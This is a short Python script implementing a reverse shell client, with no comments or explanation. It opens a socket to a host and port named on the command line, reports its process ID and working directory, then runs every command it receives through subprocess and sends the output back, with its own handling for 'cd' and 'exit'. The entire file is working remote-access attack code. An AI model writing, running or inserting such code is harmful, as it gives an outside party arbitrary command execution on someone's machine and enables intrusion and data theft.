import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1].split(':')[0]
SERVER_PORT = int(sys.argv[1].split(':')[1])
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
PID = str(os.getpid())

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
s.send(PID.encode())
while s.recv(BUFFER_SIZE).decode() != "1": pass
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    try:
        command = s.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":
            break
        if splited_command[0].lower() == "cd":
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = ""
        else:
            output = subprocess.getoutput(command)
        cwd = os.getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
    except Exception as e:
        s.send(f"[-] (CLIENT) Error shell: {e}{SEPARATOR}{cwd}".encode())
s.close()
